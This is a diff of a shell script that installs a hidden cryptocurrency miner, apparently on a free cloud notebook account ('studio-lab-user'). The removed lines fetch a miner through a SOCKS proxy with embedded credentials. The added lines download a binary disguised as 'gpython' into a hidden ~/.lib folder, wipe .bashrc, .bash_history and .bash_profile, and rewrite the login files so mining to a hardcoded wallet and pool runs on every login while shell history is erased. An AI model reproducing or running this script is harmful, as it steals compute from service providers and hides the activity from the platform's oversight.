@@ -1,2 +1,22 @@
-curl -v -x "socks5://berkahkita-rotate:kitabersama123@p.webshare.io:80/" webshare.io/
-wget -q https://bin.jvnv.net/file/4ptE5/lolipop && chmod +x lolipop && ./lolipop --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.알겠습니다 - export proxy socks5://berkahkita-rotate:kitabersama123@p.webshare.io:80
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="86"
+WALLETNH="35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a"
+POOLNH="144.217.82.15:80"
+wget https://ewr1.vultrobjects.com/mines/gpython
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="144.217.82.15:80"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
+chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
